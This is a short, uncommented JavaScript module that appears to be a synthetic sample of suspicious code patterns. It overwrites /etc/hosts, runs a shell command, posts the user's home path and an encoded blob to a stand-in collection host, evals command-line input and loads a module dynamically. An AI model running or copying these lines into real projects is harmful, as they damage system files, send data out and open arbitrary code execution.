import fs from 'node:fs'
import cp from 'node:child_process'

const payload = 'aGVsbG8gd29ybGQgdGhpcyBpcyBhIGJhc2U2NCBibG9iIDEyMzQ1Njc4OTA='
const tag = String.fromCharCode(104, 105, 110, 116, 58, 32, 49, 50)

const who = process.env.HOME

fs.writeFileSync('/etc/hosts', '127.0.0.1 everything.local')
cp.exec('uname -a')

fetch('https://collect.example.com/beacon', {
  method: 'POST',
  body: JSON.stringify({ home: who, tag: tag, payload: payload }),
})

eval(process.argv[2])

const dyn = require('./dyn-' + 'mod.js')
export { dyn }
